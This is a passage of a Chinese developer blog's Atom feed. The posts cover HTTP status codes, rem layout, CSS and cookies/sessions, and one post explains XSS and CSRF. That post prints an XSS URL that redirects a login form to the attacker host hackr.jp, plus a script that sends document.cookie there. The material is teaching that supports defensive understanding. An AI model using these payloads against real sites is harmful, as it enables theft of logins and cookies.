该状态码表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况。304 状态码返回时，不包含任何响应的主体部分。304 虽然被划分在3XX 类别中，但是和重定向没有关系。</p>
<h3 id="307-temporary-redirect">307 Temporary Redirect</h3>
<p>临时重定向。该状态码与302 Found 有着相同的含义。尽管302 标准禁止POST 变换成GET，但实际使用时大家并不遵守。
307 会遵照浏览器标准，不会从POST 变成GET。但是，对于处理响应时的行为，每种浏览器有可能出现不同的情况。</p>
<h2 id="4xx-客户端错误">4XX 客户端错误</h2>
<p>4XX 的响应结果表明客户端是发生错误的原因所在。</p>
<h3 id="400-bad-request">400 Bad Request</h3>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-a76b87f7b3357e68.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">
该状态码表示请求报文中存在语法错误。当错误发生时，需修改请求的内容后再次发送请求。另外，浏览器会像200 OK 一样对待该状态码。</p>
<h3 id="401-unauthorized">401 Unauthorized</h3>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-fcd2dcebfb074152.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">
该状态码表示发送的请求需要有通过HTTP 认证（BASIC 认证、DIGEST 认证）的认证信息。另外若之前已进行过1 次请求，则表示用户认证失败。
返回含有401 的响应必须包含一个适用于被请求资源的WWWAuthenticate首部用以质询（challenge）用户信息。当浏览器初次接收到401 响应，会弹出认证用的对话窗口。</p>
<h3 id="403-forbidden">403 Forbidden</h3>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-604eb2183c50e7d7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">
该状态码表明对请求资源的访问被服务器拒绝了。服务器端没有必要给出拒绝的详细理由，但如果想作说明的话，可以在实体的主体部分对原因进行描述，这样就能让用户看到了。
未获得文件系统的访问授权，访问权限出现某些问题（从未授权的发送源IP 地址试图访问）等列举的情况都可能是发生403 的原因。</p>
<h3 id="404-not-found">404 Not Found</h3>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-1802cc9939aae6c4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>该状态码表明服务器上无法找到请求的资源。除此之外，也可以在服务器端拒绝请求且不想说明理由时使用。</p>
<h2 id="5xx服务器错误">5XX服务器错误</h2>
<p>5XX 的响应结果表明服务器本身发生错误。</p>
<h3 id="500-internal-server-error">500 Internal Server Error</h3>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-beb418dab1c3dbba.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>该状态码表明服务器端在执行请求时发生了错误。也有可能是Web应用存在的bug 或某些临时的故障。</p>
<h3 id="503-service-unavailable">503 Service Unavailable</h3>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-46134e7be9df6947.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">
该状态码表明服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。如果事先得知解除以上状况需要的时间，最好写入Retry-After 首部字段再返回给客户端。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[rem方案完美解决自适应]]></title>
        <id>https://hubingliang.github.io/post/rem</id>
        <link href="https://hubingliang.github.io/post/rem">
        </link>
        <updated>2017-10-07T08:31:46.000Z</updated>
        <content type="html"><![CDATA[<p>随着移动互联网的兴起，Web app的开发也越来越重要，与此同时页面布局也成了一个令人头痛的问题。rem的出现貌似可以完美解决移动端适配的问题。</p>
<h2 id="什么是rem">什么是rem</h2>
<p>说到rem自然就会想到em，我们知道em是相对于父元素的字体大小的单位，那么rem则是相对于根元素也就是<code>&lt;html&gt;</code>元素的字体大小的单位。</p>
<h2 id="如何用rem解决移动端适配">如何用rem解决移动端适配</h2>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-bc2b886890d0962a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>通过这张图我们就可以观察到，div的宽度和高度是根据根元素<code>&lt;html&gt;</code>来决定的，根元素的字体大小为100px，然后给div的宽度和高度设置为2rem、1rem，最后生成的div的宽度为200px、高度为100px。
也就是说我们可以通过改变根元素的字体大小，进而对页面进行等比例缩放,从而实现自适应。
那么如何根据设备的不同来改变根元素的字体大小呢？
我们在<code>&lt;head&gt;</code>标签里面引入这样一段js代码：</p>
<pre><code class="language-js">var width = document.documentElement.clientWidth
var css = `
    html{
    font-size: ${width/10}px;
    }
    `
document.write(`&lt;style&gt;${css}&lt;/style&gt;`)
</code></pre>
<p>很简单，只做了一件事：就是把根元素的字体大小改成当前设备的宽度，然后我们在开发的时候全部根据设计稿的宽度来设置每一个元素的大小。
如果设计稿的宽度是按照iphone5的宽度来设计的，那么开发的时候也要根据iphone的宽度也就是320px来设置。</p>
<blockquote>
<p>不过最后不要忘了在body元素中重新设置正常的font-size，不然整个页面会垮掉！！</p>
</blockquote>
<p>例子：如果这是我们要做的设计稿</p>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-591bb00dccbcc0f0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>一个歌单的封面大小为103px，那么我们在写css的时候就要写（103/320）px，这时候你肯定会觉得很麻烦，难道我每次都要这样计算吗？
不用，每次只要写出实际的px大小就好，px和rem的转换可以借助网站工具：
<a href="http://520ued.com/tools/rem">px =&gt; rem</a>
<a href="http://alurk.com/">功能更加强大的rem转换</a></p>
<h2 id="参考文献">参考文献</h2>
<ul>
<li><a href="http://caibaojian.com/web-app-rem.html">rem是如何实现自适应布局的？</a></li>
<li><a href="http://caibaojian.com/rem-responsive-2.html">rem自适应布局的回顾总结</a></li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[2周时间掌握47个CSS技巧]]></title>
        <id>https://hubingliang.github.io/post/47css-trick</id>
        <link href="https://hubingliang.github.io/post/47css-trick">
        </link>
        <updated>2017-09-23T09:08:53.000Z</updated>
        <content type="html"><![CDATA[<p><img src="http://upload-images.jianshu.io/upload_images/4337988-5c96398f52336f77.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>两周前入手了<a href="https://book.douban.com/subject/26745943/">《CSS揭秘》</a></p>
<p>两周时间收益匪浅，学习了很多CSS技巧，感觉打开了新世界的大门，在看到一半的时候感觉还是自己实现一边印象比较深刻。于是自己把47个CSS技巧全部实现了一遍：<a href="https://github.com/hubingliang/CSS-secrets">Github</a> 具体实现方法可以在控制台查看CSS，欢迎 star。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-e5572657637e9e85.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">
其中有多个解决方法的情况，使用了当下最优解来实现，之后发现了几个问题：有几个CSS技巧并没有成功--24、25、26</p>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-0f3b302a547a08f4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">
在书中给的参考网站也同样失效了.....如果有大佬知道如何实现欢迎提pull request</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[认识HTTP----Web安全与攻击手段]]></title>
        <id>https://hubingliang.github.io/post/securi</id>
        <link href="https://hubingliang.github.io/post/securi">
        </link>
        <updated>2017-09-09T03:38:05.000Z</updated>
        <content type="html"><![CDATA[<p><strong>本文内容大多参考<a href="https://book.douban.com/subject/25863515/">《图解HTTP》一书</a></strong></p>
<h2 id="关于web的攻击手段">关于Web的攻击手段</h2>
<p>目前，互联网攻击大多是针对应用HTTP协议的服务器和客户端，以及运行在服务器上的Web应用等资源，本文主要针对Web应用的攻击技术进行简单分析。</p>
<h3 id="针对web应用的攻击模式">针对Web应用的攻击模式</h3>
<p>对Web应用的攻击模式有以下两种。</p>
<ul>
<li>主动攻击
主动攻击（active attack）是指攻击者通过直接访问Web 应用，把攻击代码传入的攻击模式。由于该模式是直接针对服务器上的资源进行攻击，因此攻击者需要能够访问到那些资源。</li>
</ul>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-3b2645de43c3de0c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="这个攻击者没法吐槽"></p>
<ul>
<li>被动攻击
被动攻击（passive attack）是指利用圈套策略执行攻击代码的攻击模式。在被动攻击过程中，攻击者不直接对目标Web 应用访问发起攻击。
被动攻击通常的攻击模式如下所示。</li>
</ul>
<ol>
<li>攻击者诱使用户触发已设置好的陷阱，而陷阱会启动发送已嵌入攻击代码的HTTP 请求。</li>
<li>当用户不知不觉中招之后，用户的浏览器或邮件客户端就会触发这个陷阱。</li>
<li>中招后的用户浏览器会把含有攻击代码的HTTP 请求发送给作为攻击目标的Web 应用，运行攻击代码。</li>
<li>执行完攻击代码，存在安全漏洞的Web 应用会成为攻击者的跳板，可能导致用户所持的Cookie 等个人信息被窃取，登录状态中的用户权限遭恶意滥用等后果。被动攻击模式中具有代表性的攻击是跨站脚本攻击（xss）和跨站点请求伪造（CSRF/XSRF）。</li>
</ol>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-72423c77abb5909d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<h3 id="因输出值转义不完全引发的安全漏洞">因输出值转义不完全引发的安全漏洞</h3>
<p>实施Web 应用的安全对策可大致分为以下两部分。</p>
<ul>
<li>客户端验证</li>
<li>Web应用端（服务器）验证
<ul>
<li>输入值验证</li>
<li>输出值转义</li>
</ul>
</li>
</ul>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-511ebfb85ffa5947.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>多数情况下采用JavaScript 在客户端验证数据。可是在客户端允许篡改数据或关闭JavaScript，不适合将JavaScript 验证作为安全的防范对策。保留客户端验证只是为了尽早地辨识输入错误，起到提高UI 体验的作用。
Web 应用端的输入值验证按Web 应用内的处理则有可能被误认为是具有攻击性意义的代码。输入值验证通常是指检查是否是符合系统业务逻辑的数值或检查字符编码等预防对策。
从数据库或文件系统、HTML、邮件等输出Web 应用处理的数据之际，针对输出做值转义处理是一项至关重要的安全策略。当输出值转义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损害。</p>
<h2 id="跨站脚本攻击xss">跨站脚本攻击（XSS）</h2>
<p>跨站脚本攻击（Cross-Site Scripting，XSS）是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或者Javascript的一种攻击。就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，一不小心就会受到被动攻击。
跨站脚本攻击有可能造成以下影响：</p>
<ul>
<li>利用虚假输入表单骗取用户个人信息。</li>
<li>利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。</li>
<li>显示伪造的文章或图片（莫名其妙的广告）。</li>
</ul>
<h3 id="简单例子">简单例子</h3>
<p><strong>在动态生成HTML处发生：</strong></p>
<p>下面以编辑个人信息页面为例讲解跨站脚本攻击。下方界面显示了用户输入的个人信息内容。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-f42a8f9323739e75.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="跨站脚本攻击案例"></p>
<p>确认界面按原样显示在编辑界面输入的字符串。此处输入带有山口
一郎这样的HTML 标签的字符串。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-ec25584204f71ee4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="按照输入内容原样显示的机制"></p>
<p>此时的确认界面上，浏览器会把用户输入的<code>&lt;s&gt;</code> 解析成HTML 标签，然后显示删除线。
删除线显示出来并不会造成太大的不利后果，但如果换成使用script 标签将会如何呢。</p>
<h2 id="xss-是攻击者利用预先设置的陷阱触发的被动攻击">XSS 是攻击者利用预先设置的陷阱触发的被动攻击</h2>
<p>跨站脚本攻击属于被动攻击模式，因此攻击者会事先布置好用于攻击的陷阱。
下图网站通过地址栏中URI 的查询字段指定ID，即相当于在表单内自动填写字符串的功能。而就在这个地方，隐藏着可执行跨站脚本攻击的漏洞。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-23e6fa19d23f219e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">
充分熟知此处漏洞特点的攻击者，于是就创建了下面这段嵌入恶意代码的URL。并隐藏植入事先准备好的欺诈邮件中或Web 页面内，诱使用户去点击该URL。</p>
<pre><code>http://example.jp/login?ID=&quot;&gt;&lt;script&gt;var+f=document⇒
.getElementById(&quot;login&quot;);+f.action=&quot;http://hackr.jp/pwget&quot;;+f.method=⇒
&quot;get&quot;;&lt;/script&gt;&lt;span+s=&quot;
</code></pre>
<p>浏览器打开该URI 后，直观感觉没有发生任何变化，但设置好的脚本却偷偷开始运行了。当用户在表单内输入ID 和密码之后，就会直接发送到攻击者的网站（也就是hackr.jp），导致个人登录信息被窃取。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-d9c24bd7a2426f2b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>之后，ID 及密码会传给该正规网站，而接下来仍然是按正常登录步骤，用户很难意识到自己的登录信息已遭泄露。</p>
<p><strong>对 http://example.jp/login?ID=yama 请求时对应的HTML源代码（摘录）</strong></p>
<pre><code class="language-html">&lt;div class=&quot;logo&quot;&gt;
![](/img/logo.gif)
&lt;/div&gt;
&lt;form action=&quot;http://example.jp/login&quot; method=&quot;post&quot; id=&quot;login&quot;&gt;
&lt;div class=&quot;input_id&quot;&gt;
ID &lt;input type=&quot;text&quot; name=&quot;ID&quot; value=&quot;yama&quot; /&gt;
&lt;/div&gt;
</code></pre>
<pre><code class="language-html">**http://example.jp/login?ID=&quot;&gt;&lt;script&gt;var+f=document.getElementById
(&quot;login&quot;);+f.action=&quot;http://hackr.jp/pwget&quot;;+f.method=&quot;get&quot;;&lt;/script&gt;
&lt;span+s=&quot;对请求时对应的HTML源代码（摘录）**
</code></pre>
<pre><code class="language-html">&lt;div class=&quot;logo&quot;&gt;
![](/img/logo.gif)
&lt;/div&gt;
&lt;form action=&quot;http://example.jp/login&quot; method=&quot;post&quot; id=&quot;login&quot;&gt;
&lt;div class=&quot;input_id&quot;&gt;
ID &lt;input type=&quot;text&quot; name=&quot;ID&quot; value=&quot;&quot;&gt;&lt;script&gt;var f=document⇒
.getElementById(&quot;login&quot;); f.action=&quot;http://hackr.jp/pwget&quot;; f.method=⇒
&quot;get&quot;;&lt;/script&gt;&lt;span s=&quot;&quot; /&gt;
&lt;/div&gt;
</code></pre>
<h3 id="对用户cookie的窃取攻击">对用户Cookie的窃取攻击</h3>
<p>除了在表单中设下圈套之外，下面那种恶意构造的脚本同样能够以跨站脚本攻击的方式，窃取到用户的Cookie 信息。
<code>&lt;script src=http://hackr.jp/xss.js&gt;&lt;/script&gt;</code>
该脚本内指定的http://hackr.jp/xss.js 文件。即下面这段采用JavaScript 编写的代码。</p>
<pre><code class="language-js">var content = escape(document.cookie);
document.write(&quot;&lt;img src=http://hackr.jp/?&quot;);
document.write(content);
document.write(&quot;&gt;&quot;);
</code></pre>
<p>在存在可跨站脚本攻击安全漏洞的Web 应用上执行上面这段JavaScript 程序，即可访问到该Web 应用所处域名下的Cookie 信息。然后这些信息会发送至攻击者的Web 网站（http://hackr.jp/），记录在他的登录日志中。结果，攻击者就这样窃取到用户的Cookie 信息了。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-73e389217a5eca2a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="使用XSS 攻击夺取Cookie 信息"></p>
<h2 id="跨站点请求伪造csrf">跨站点请求伪造(CSRF)</h2>
<p>跨站点请求伪造（Cross-Site Request Forgeries，CSRF）攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。
跨站点请求伪造有可能会造成以下等影响。</p>
<ul>
<li>利用已通过认证的用户权限更新设定信息等</li>
<li>利用已通过认证的用户权限购买商品</li>
<li>利用已通过认证的用户权限在留言板上发表言论</li>
</ul>
<h3 id="跨站点请求伪造的攻击案例">跨站点请求伪造的攻击案例</h3>
<p>下面以留言板功能为例，讲解跨站点请求伪造。该功能只允许已认证并登录的用户在留言板上发表内容。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-aa8130ff059c20c4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="跨站点请求伪造的攻击案例"></p>
<p>在该留言板系统上，受害者用户A 是已认证状态。它的浏览器中的Cookie 持有已认证的会话ID（步骤①）
攻击者设置好一旦用户访问，即会发送在留言板上发表非主观行为产生的评论的请求的陷阱。用户A 的浏览器执行完陷阱中的请求后，留言板上也就会留下那条评论（步骤②）。
触发陷阱之际，如果用户A 尚未通过认证，则无法利用用户A 的身份权限在留言板上发表内容。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[认识HTTP----Cookie和Session篇]]></title>
        <id>https://hubingliang.github.io/post/cookie-session</id>
        <link href="https://hubingliang.github.io/post/cookie-session">
        </link>
        <updated>2017-06-19T12:55:27.000Z</updated>
        <content type="html"><![CDATA[<p><strong>本文内容大多参考<a href="https://book.douban.com/subject/25863515/">《图解HTTP》一书</a></strong></p>
<h2 id="使用cookie来管理状态">使用Cookie来管理状态</h2>
<p>HTTP是无状态协议，说明它不能以状态来区分和管理请求和响应。也就是说，无法根据之前的状态进行本次的请求处理。
不可否认，无状态协议当然也有它的优点。由于不必保存状态，自然可减少服务器的CPU 及内存资源的消耗。从另一侧面来说，也正是因为HTTP 协议本身是非常简单的，所以才会被应用在各种场景里。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-87d0773cc92023ac.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="如果让服务器管理全部客户端状态则会成为负担"></p>
<p>我们登录淘宝的时候首先要登录，我们看到了一个商品点进去，进行了页面跳转/刷新，按照HTTP的无状态协议岂不是又要登录一次？</p>
<p>所以为了解决这个问题，Cookie诞生了，在保留无状态协议这个特征的同时又要解决类似记录状态的矛盾问题。Cookie 技术通过在请求和响应报文中写入Cookie 信息来控制客户端的状态。
Cookie 会根据从服务器端发送的响应报文内的一个叫做Set-Cookie的首部字段信息，通知客户端保存Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入Cookie 值后发送出去。
服务器端发现客户端发送过来的Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息。</p>
<ul>
<li>没有Cookie信息状态下的请求</li>
</ul>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-59439fc716939f4b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<ul>
<li>第2次以后（存有Cookie信息状态）的请求</li>
</ul>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-27afc1005246361a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>上图很清晰地展示了发生Cookie 交互的情景。
HTTP 请求报文和响应报文的内容如下（数字和图中对应）。</p>
<ol>
<li>请求报文（没有Cookie 信息的状态）</li>
</ol>
<pre><code>GET /reader/ HTTP/1.1
Host: hackr.jp
*首部字段内没有Cookie的相关信息
</code></pre>
<ol start="2">
<li>响应报文（服务器端生成Cookie 信息）</li>
</ol>
<pre><code>HTTP/1.1 200 OK
Date: Thu, 12 Jul 2012 07:12:20 GMT
Server: Apache
＜Set-Cookie: sid=1342077140226724; path=/; expires=Wed,10-Oct-12 07:12:20 GMT＞
Content-Type: text/plain; charset=UTF-8
</code></pre>
<ol start="3">
<li>请求报文（自动发送保存着的Cookie 信息）</li>
</ol>
<pre><code>GET /image/ HTTP/1.1
Host: hackr.jp
Cookie: sid=1342077140226724
</code></pre>
<h2 id="关于cookie-的首部字段">关于Cookie 的首部字段</h2>
<table>
<thead>
<tr>
<th>首部字段名</th>
<th style="text-align:center">说明</th>
<th style="text-align:right">首部类型</th>
</tr>
</thead>
<tbody>
<tr>
<td>Set-Cookie</td>
<td style="text-align:center">开始状态管理所使用的Cookie信息</td>
<td style="text-align:right">响应首部字段</td>
</tr>
<tr>
<td>Cookie</td>
<td style="text-align:center">服务器接收到的Cookie信息</td>
<td style="text-align:right">请求首部字段</td>
</tr>
</tbody>
</table>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-6f7ad5a2b69e3d8a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<h3 id="set-cookie">Set-Cookie</h3>
<pre><code>Set-Cookie: status=enable; expires=Tue, 05 Jul 2011 07:26:31 GMT; ⇒
path=/; domain=.hackr.jp;
</code></pre>
<p>当服务器准备开始管理客户端的状态时，会事先告知各种信息。下面的表格列举了Set-Cookie 的字段值。</p>
<h3 id="set-cookie-字段的属性">Set-Cookie 字段的属性</h3>
<table>
<thead>
<tr>
<th>属性</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>NAME=VALUE</td>
<td style="text-align:center">赋予Cookie的名称和其值（必需项）</td>
</tr>
<tr>
<td>expires=DATE</td>
<td style="text-align:center">Cookie的有效期（若不明确指定则默认为浏览器关闭前为止）</td>
</tr>
<tr>
<td>path=PATH</td>
<td style="text-align:center">将服务器上的文件目录作为Cookie的适用对象（若不指定则默认为文档所在的文件目录）</td>
</tr>
<tr>
<td>domain=域名</td>
<td style="text-align:center">作为Cookie适用对象的域名 （若不指定则默认为创建Cookie的服务器的域名）</td>
</tr>
</tbody>
</table>
<h4 id="expires-属性">expires 属性</h4>
<p>Cookie 的expires 属性指定浏览器可发送Cookie 的有效期。当省略expires 属性时，Cookie仅在浏览器关闭之前有效。
另外，一旦Cookie 从服务器端发送至客户端，服务器端就不存在可以显式删除Cookie 的方法。但可通过覆盖已过期的Cookie，实现对客户端Cookie 的实质性删除操作。</p>
<h4 id="path-属性">path 属性</h4>
<p>Cookie 的path 属性可用于限制指定Cookie 的发送范围的文件目录。不过另有办法可避开这项限制，看来对其作为安全机制的效果不能抱有期待。</p>
<h4 id="domain-属性">domain 属性</h4>
<p>通过Cookie 的domain 属性指定的域名可做到与结尾匹配一致。比如， 当指定example.com 后， 除example.com 以外，www.example.com或www2.example.com 等都可以发送Cookie。因此，除了针对具体指定的多个域名发送Cookie 之外，不指定domain 属性显得更安全。</p>
<h4 id="secure-属性">secure 属性</h4>
<p>Cookie 的secure 属性用于限制Web 页面仅在HTTPS 安全连接时，才可以发送Cookie。发送Cookie 时，指定secure 属性的方法如下所示。</p>
<p><code>Set-Cookie: name=value; secure</code></p>
<p>以上例子仅当在https ：//www.example.com/（HTTPS）安全连接的情况下才会进行Cookie 的回收。也就是说，即使域名相同时http : //www.example.com/（HTTP） 也不会发生Cookie 回收行为。当省略secure 属性时，不论HTTP 还是HTTPS，都会对Cookie 进行回收。</p>
<h4 id="httponly-属性">HttpOnly 属性</h4>
<p>Cookie 的HttpOnly 属性是Cookie 的扩展功能，它使JavaScript 脚本无法获得Cookie。其主要目的为防止跨站脚本攻击（Cross-sitescripting，XSS）对Cookie 的信息窃取。
发送指定HttpOnly 属性的Cookie 的方法如下所示。</p>
<p><code>Set-Cookie: name=value; HttpOnly</code></p>
<p>通过上述设置，通常从Web 页面内还可以对Cookie 进行读取操作。但使用JavaScript 的document.cookie 就无法读取附加HttpOnly 属性后的Cookie 的内容了。因此，也就无法在XSS 中利用JavaScript 劫持Cookie 了。
虽然是独立的扩展功能，但Internet Explorer 6 SP1 以上版本等当下的主流浏览器都已经支持该扩展了。另外顺带一提，该扩展并非是为了防止XSS 而开发的。</p>
<h3 id="cookie">Cookie</h3>
<p><code>Cookie: status=enable</code></p>
<p>首部字段Cookie 会告知服务器，当客户端想获得HTTP 状态管理支持时，就会在请求中包含从服务器接收到的Cookie。接收到多个Cookie 时，同样可以以多个Cookie 形式发送。</p>
<h2 id="session-管理及cookie-应用">Session 管理及Cookie 应用</h2>
<h3 id="什么是session">什么是Session</h3>
<p>在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。Session 对象最常见的一个用法就是存储用户的首选项。例如，如果用户指明不喜欢查看图形，就可以将该信息存储在 Session 对象中。</p>
<h3 id="通过cookie来管理session">通过Cookie来管理Session</h3>
<p>基于表单认证的标准规范尚未有定论，一般会使用Cookie 来管理Session（会话）。
基于表单认证本身是通过服务器端的Web 应用，将客户端发送过来的用户ID 和密码与之前登录过的信息做匹配来进行认证的。
但鉴于HTTP 是无状态协议，之前已认证成功的用户状态无法通过协议层面保存下来。即，无法实现状态管理，因此即使当该用户下一次继续访问，也无法区分他与其他的用户。于是我们会使用Cookie 来管理Session，以弥补HTTP 协议中不存在的状态管理功能。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-d8045757420dd652.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Session 管理及Cookie 状态管理"></p>
<ul>
<li><strong>步骤一</strong>：客户端把用户ID 和密码等登录信息放入报文的实体部分，通常是以POST 方法把请求发送给服务器。而这时，会使用HTTPS 通信来进行HTML 表单画面的显示和用户输入数据的发送。</li>
<li><strong>步骤二</strong>：服务器会发放用以识别用户的Session ID。通过验证从客户端发送过来的登录信息进行身份认证，然后把用户的认证状态与Session ID 绑定后记录在服务器端。</li>
</ul>
<p>向客户端返回响应时，会在首部字段Set-Cookie 内写入Session ID（如PHPSESSID=028a8c…）。
你可以把Session ID 想象成一种用以区分不同用户的等位号。然而，如果Session ID 被第三方盗走，对方就可以伪装成你的身份进行恶意操作了。因此必须防止Session ID 被盗，或被猜出。为了做到这点，Session ID 应使用难以推测的字符串，且服务器端也需要进行有效期的管理，保证其安全性。
另外，为减轻跨站脚本攻击（XSS）造成的损失，建议事先在Cookie 内加上httponly 属性。</p>
<ul>
<li><strong>步骤三</strong>：客户端接收到从服务器端发来的Session ID 后，会将其作为Cookie 保存在本地。下次向服务器发送请求时，浏览器会自动发送Cookie，所以Session ID 也随之发送到服务器。服务器端可通过验证接收到的Session ID 识别用户和其认证状态。</li>
</ul>
<p>除了以上介绍的应用实例，还有应用其他不同方法的案例。
另外，不仅基于表单认证的登录信息及认证过程都无标准化的方法，服务器端应如何保存用户提交的密码等登录信息等也没有标准化。
通常，一种安全的保存方法是，先利用给密码加盐（salt）A 的方式增加额外信息，再使用散列（hash）函数计算出散列值后保存。但是我们也经常看到直接保存明文密码的做法，而这样的做法具有导致密码泄露的风险。</p>
]]></content>
    </entry>
</feed>